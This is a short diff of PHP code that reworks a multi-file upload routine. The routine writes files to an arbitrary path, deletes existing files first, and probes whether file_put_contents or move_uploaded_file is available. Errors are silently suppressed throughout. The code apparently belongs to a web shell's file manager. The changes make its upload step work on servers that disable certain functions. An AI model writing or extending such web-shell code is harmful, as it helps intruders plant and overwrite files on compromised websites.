@@ -504,9 +504,18 @@ if(isset($_GET['act'])){
 		for($cf=0; $cf<count(@$_FILES['xfile']['name']); $cf++){
 			if(isset($_FILES['xfile']['name'][$cf]) && @$_FILES['xfile']['name'][$cf] != null){
 				$fname = @$_FILES['xfile']['name'][$cf];
-				$upfiles = @file_put_contents($xpath."/".$fname, @file_get_contents(@$_FILES['xfile']['tmp_name'][$cf]));
-				if($upfiles){
-					$outs[] = file_exists($xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
+				if(file_exists($xpath."/".$fname)){
+					@unlink($xpath."/".$fname);
+				}
+				if(AvFunc(array('file_put_contents'))){
+					$upfiles = @file_put_contents($xpath."/".$fname, @file_get_contents(@$_FILES['xfile']['tmp_name'][$cf]));
+					if($upfiles){
+						$outs[] = file_exists($xpath."/".$fname) ? $fname." uploaded!" : $fname." failed!";
+					} else {
+						$outs[] = $fname." failed!";
+					}
+				} else if(AvFunc(array('move_uploaded_file'))){
+					$outs[] = move_uploaded_file($_FILES['xfile']['tmp_name'][$cf], $fname) ? $fname." uploaded!" : $fname." failed!";
 				} else {
 					$outs[] = $fname." failed!";
 				}
